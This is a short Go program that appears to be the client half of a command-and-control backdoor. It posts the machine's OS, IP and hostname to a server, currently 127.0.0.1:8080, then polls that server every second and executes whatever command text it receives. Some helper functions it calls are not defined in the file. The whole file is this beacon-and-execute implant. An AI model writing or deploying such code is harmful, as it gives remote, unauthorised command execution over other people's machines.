package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
	"net/http"

	//"strings"
    "log"
    "os/exec"

    "time"

)


func execute(cmd string) string{ 
    out, err := exec.Command(cmd).Output()
    if err != nil {
        log.Fatal(err)
    }
    return string(out)
}

func recieveCommand(path string) string{ 
    resp, err := http.Get(path)
    if err != nil { 
        fmt.Println("waiting...")
        return ""
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    fmt.Println(execute(string(body)))
    return string(body)
   

}

func rsp(response string) { 
    
}


func main() {
	
    //for now, make key on client(change in revision)
    reqBody, err := json.Marshal(map[string]string{
        "key1": "keyvalue",
		
    })
    if err != nil {
        print(err)
	}
	
	os := getOS()
    ip := GetOutboundIP().String()
    host := getHostname()
  
    resp, err := http.Post("http://127.0.0.1:8080/form?os=" + os + "&ip=" + ip  + "&host=" + host,
        "application/json", bytes.NewBuffer(reqBody))
    if err != nil {
        print(err)
    }
    
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        print(err)
    }
    fmt.Println(string(body))
    for{
    fmt.Println(ip)
    recieveCommand("http://127.0.0.1:8080/" + ip)
    time.Sleep(1000 * time.Millisecond)
    }

}
